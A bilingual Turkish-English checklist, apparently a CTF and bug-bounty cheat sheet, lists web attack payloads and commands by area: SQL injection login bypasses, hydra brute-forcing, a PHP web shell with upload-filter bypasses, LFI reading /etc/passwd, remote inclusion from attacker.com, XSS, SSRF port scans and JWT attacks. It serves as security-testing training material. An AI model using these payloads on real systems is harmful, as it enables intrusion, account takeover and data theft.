# 🔐 Vulnerability Hunter Checklist
### CTF & Bug Bounty Quick Reference Guide

<div align="center">

![Security](https://img.shields.io/badge/Security-Checklist-red?style=for-the-badge&logo=hackthebox&logoColor=white)
![CTF](https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge&logo=tryhackme&logoColor=white)

**[🇹🇷 Türkçe](#-türkçe) | [🇬🇧 English](#-english)**

</div>

---

# 🇹🇷 Türkçe

## 📋 İçindekiler
- [Login Sayfası](#-login-sayfası)
- [File Upload](#-file-upload)
- [URL Parametreleri](#-url-parametreleri)
- [Cookie & Session](#-cookie--session)
- [API Endpoint](#-api-endpoint)

---

## 🔑 Login Sayfası

### Kontrol Listesi
| Test | Açıklama | Komut/Payload |
|------|----------|---------------|
| ⬜ SQL Injection | Giriş bypass dene | `' OR 1=1--` veya `admin'--` |
| ⬜ Default Credentials | Varsayılan şifreler | `admin:admin`, `root:root`, `test:test` |
| ⬜ Brute Force | Şifre deneme koruması var mı? | `hydra -l admin -P wordlist.txt <IP> http-post-form` |
| ⬜ Username Enumeration | Kullanıcı adı tespiti | Farklı hata mesajları kontrol et |
| ⬜ Password Reset | Şifre sıfırlama zafiyeti | Token tahmin edilebilir mi? |

### Komutlar
```bash
# SQL Injection testi (sqlmap)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Brute Force (hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Default credential tarama (nmap)
nmap --script http-default-accounts target.com
```

---

## 📁 File Upload

### Kontrol Listesi
| Test | Açıklama | Payload |
|------|----------|---------|
| ⬜ Extension Bypass | Uzantı kontrolü atla | `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg` |
| ⬜ MIME Type | Content-Type manipülasyonu | `Content-Type: image/jpeg` (PHP dosyası için) |
| ⬜ Magic Bytes | Dosya başlığı ekleme | `GIF89a;<?php system($_GET['cmd']);?>` |
| ⬜ Path Traversal | Dizin atlama | `../../../var/www/html/shell.php` |
| ⬜ SVG XSS | SVG ile script çalıştır | `<svg onload=alert(1)>` |

### Komutlar
```bash
# Basit PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Magic bytes ekle
(echo -n 'GIF89a'; cat shell.php) > shell.gif.php

# Curl ile upload test
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload
```

---

## 🔗 URL Parametreleri

### Kontrol Listesi
| Test | Açıklama | Payload |
|------|----------|---------|
| ⬜ LFI (Local File Inclusion) | Yerel dosya okuma | `?page=../../../etc/passwd` |
| ⬜ RFI (Remote File Inclusion) | Uzak dosya dahil etme | `?page=http://attacker.com/shell.txt` |
| ⬜ XSS (Reflected) | Script enjeksiyonu | `?search=<script>alert(1)</script>` |
| ⬜ SSRF | Sunucu taraflı istek | `?url=http://localhost:22` |
| ⬜ Open Redirect | Yönlendirme zafiyeti | `?redirect=http://evil.com` |

### Komutlar
```bash
# LFI testi
curl "http://target.com/page.php?file=../../../etc/passwd"

# LFI with null byte (eski PHP)
curl "http://target.com/page.php?file=../../../etc/passwd%00"

# PHP filter (base64 okuma)
curl "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"

# SSRF port tarama
for port in 21 22 80 443 3306 6379; do
  curl "http://target.com/?url=http://127.0.0.1:$port" 
done
```

---

## 🍪 Cookie & Session

### Kontrol Listesi
| Test | Açıklama | Kontrol |
|------|----------|---------|
| ⬜ Session Fixation | Oturum sabitleme | Login sonrası session ID değişiyor mu? |
| ⬜ JWT Vulnerabilities | JWT zafiyetleri | Algorithm: none, weak secret |
| ⬜ Cookie Flags | Güvenlik bayrakları | HttpOnly, Secure, SameSite |
| ⬜ IDOR | Yetkisiz erişim | `user_id=1` → `user_id=2` |

### Komutlar
```bash
# JWT decode (jwt_tool)
python3 jwt_tool.py <token>

# JWT none algorithm
python3 jwt_tool.py <token> -X a

# JWT brute force
python3 jwt_tool.py <token> -C -d wordlist.txt

# Cookie analiz
curl -c cookies.txt -b cookies.txt http://target.com/
```

---

## 🌐 API Endpoint

### Kontrol Listesi
| Test | Açıklama | Payload |
|------|----------|---------|
| ⬜ Method Tampering | HTTP method değiştir | GET→POST→PUT→DELETE |
| ⬜ Parameter Pollution | Parametre kirliliği | `?id=1&id=2` |
| ⬜ Rate Limiting | Hız sınırı var mı? | Çoklu istek gönder |
| ⬜ API Versioning | Eski API versiyonları | `/api/v1/` → `/api/v2/` |
| ⬜ Hidden Endpoints | Gizli endpointler | `/api/admin`, `/api/debug` |

### Komutlar
```bash
# API endpoint keşfi (ffuf)
ffuf -u http://target.com/api/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Method test
for method in GET POST PUT DELETE PATCH OPTIONS; do
  curl -X $method http://target.com/api/users
done

# Rate limit test
for i in {1..100}; do curl http://target.com/api/login; done
```

---

# 🇬🇧 English

## 📋 Table of Contents
- [Login Page](#-login-page)
- [File Upload](#-file-upload-1)
- [URL Parameters](#-url-parameters)
- [Cookie & Session](#-cookie--session-1)
- [API Endpoint](#-api-endpoint-1)

---

## 🔑 Login Page

### Checklist
| Test | Description | Command/Payload |
|------|-------------|-----------------|
| ⬜ SQL Injection | Bypass login | `' OR 1=1--` or `admin'--` |
| ⬜ Default Credentials | Default passwords | `admin:admin`, `root:root`, `test:test` |
| ⬜ Brute Force | Rate limiting check | `hydra -l admin -P wordlist.txt <IP> http-post-form` |
| ⬜ Username Enumeration | User discovery | Check for different error messages |
| ⬜ Password Reset | Reset flow flaws | Is token predictable? |

### Commands
```bash
# SQL Injection test (sqlmap)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Brute Force (hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Default credential scan (nmap)
nmap --script http-default-accounts target.com
```

---

## 📁 File Upload

### Checklist
| Test | Description | Payload |
|------|-------------|---------|
| ⬜ Extension Bypass | Bypass extension filter | `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg` |
| ⬜ MIME Type | Content-Type manipulation | `Content-Type: image/jpeg` (for PHP file) |
| ⬜ Magic Bytes | Add file header | `GIF89a;<?php system($_GET['cmd']);?>` |
| ⬜ Path Traversal | Directory traversal | `../../../var/www/html/shell.php` |
| ⬜ SVG XSS | Execute script via SVG | `<svg onload=alert(1)>` |

---

## 🔗 URL Parameters

### Checklist
| Test | Description | Payload |
|------|-------------|---------|
| ⬜ LFI (Local File Inclusion) | Read local files | `?page=../../../etc/passwd` |
| ⬜ RFI (Remote File Inclusion) | Include remote file | `?page=http://attacker.com/shell.txt` |
| ⬜ XSS (Reflected) | Script injection | `?search=<script>alert(1)</script>` |
| ⬜ SSRF | Server-side request | `?url=http://localhost:22` |
| ⬜ Open Redirect | Redirect vulnerability | `?redirect=http://evil.com` |

---

## 🍪 Cookie & Session

### Checklist
| Test | Description | Check |
|------|-------------|-------|
| ⬜ Session Fixation | Session fixation | Does session ID change after login? |
| ⬜ JWT Vulnerabilities | JWT flaws | Algorithm: none, weak secret |
| ⬜ Cookie Flags | Security flags | HttpOnly, Secure, SameSite |
| ⬜ IDOR | Unauthorized access | `user_id=1` → `user_id=2` |

---

## 🌐 API Endpoint

### Checklist
| Test | Description | Payload |
|------|-------------|---------|
| ⬜ Method Tampering | Change HTTP method | GET→POST→PUT→DELETE |
| ⬜ Parameter Pollution | Parameter pollution | `?id=1&id=2` |
| ⬜ Rate Limiting | Check rate limits | Send multiple requests |
| ⬜ API Versioning | Old API versions | `/api/v1/` → `/api/v2/` |
| ⬜ Hidden Endpoints | Hidden endpoints | `/api/admin`, `/api/debug` |

---

<div align="center">

## 🛠️ Useful Tools

| Tool | Purpose | Link |
|------|---------|------|
| Burp Suite | Web proxy | [portswigger.net](https://portswigger.net/burp) |
| sqlmap | SQL Injection | [sqlmap.org](https://sqlmap.org) |
| ffuf | Fuzzing | [github.com/ffuf](https://github.com/ffuf/ffuf) |
| jwt_tool | JWT testing | [github.com/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| Hydra | Brute force | [github.com/hydra](https://github.com/vanhauser-thc/thc-hydra) |

---

**Made with joy by [Efe Şahin](https://github.com/efesahins1035) & Atlas-01**

*For educational purposes only. Always get permission before testing!*

</div>
